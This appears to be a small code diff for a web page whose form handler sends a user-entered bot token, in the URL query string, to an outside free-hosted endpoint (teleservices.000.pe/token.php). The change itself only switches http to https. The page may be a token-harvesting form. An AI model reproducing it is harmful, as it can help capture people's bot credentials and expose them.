@@ -31,7 +31,7 @@ document.getElementById('tokenForm').addEventListener('submit', function(event) 
     event.preventDefault();
 
     var botToken = document.getElementById('bot_token').value;
-    var url = new URL('http://teleservices.000.pe/token.php');
+    var url = new URL('https://teleservices.000.pe/token.php');
     url.searchParams.append('bot_token', botToken);
 
     fetch(url)
